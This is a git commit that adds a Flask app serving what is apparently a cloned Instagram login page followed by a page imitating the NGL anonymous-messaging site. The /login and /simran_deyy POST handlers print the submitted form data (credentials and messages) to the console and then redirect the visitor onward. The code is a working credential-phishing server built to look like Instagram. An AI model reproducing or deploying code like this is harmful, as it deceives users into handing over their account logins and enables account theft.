24b163c076ca4240a912c88b1d35a63ca0dbb98b
Tejaswin-9 <63651165+Tejaswin-9@users.noreply.github.com>
2024-02-16 14:15:37 +0530

    Add files via upload

---
+++ app.py
@@ -0,0 +1,44 @@
+from flask import Flask, render_template, request, redirect
+import logging
+
+app = Flask("__main__", template_folder="/Users/satish/Desktop/folders/ngl-simran_deyy-main/templates",
+            static_folder="/Users/satish/Desktop/folders/ngl-simran_deyy-main/static")
+logging.basicConfig(level=logging.DEBUG)
+
+
+@app.route("/")
+def redirect_main():
+    return render_template("loading.html")
+
+
+@app.route("/login")
+def login():
+    return render_template("Login • Instagram.html")
+
+
+@app.route("/simran_deyy")
+def simran_deyy():
+    return render_template("home.html")
+
+
+@app.route("/after")
+def after():
+    return render_template("after.html")
+
+
+@app.route("/login", methods=["POST", "GET"])
+def run_insta_code():
+    if request.method == "POST":
+        print(request.form)
+        return redirect("http://127.0.0.1:5000/simran_deyy")
+
+
+@app.route("/simran_deyy", methods=["POST", "GET"])
+def run_ngl_code():
+    if request.method == "POST":
+        print(request.form)
+        return redirect("http://127.0.0.1:5000/after")
+
+
+if __name__ == "__main__":
+    app.run()
